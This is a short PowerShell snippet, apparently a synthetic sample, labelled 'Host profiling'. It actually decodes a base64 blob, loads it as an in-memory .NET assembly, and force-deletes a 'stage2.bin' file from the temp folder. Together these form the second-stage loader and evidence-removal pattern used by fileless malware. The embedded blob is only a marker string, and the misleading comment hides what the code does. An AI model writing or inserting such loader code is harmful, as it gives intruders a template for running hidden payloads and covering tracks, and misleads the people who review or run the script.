
<# Host profiling #> $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjptNDl0d3lkOHJy"); $OperationResult = [Reflection.Assembly]::Load($StageBytes); $OperationResult.GetTypes().Count; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
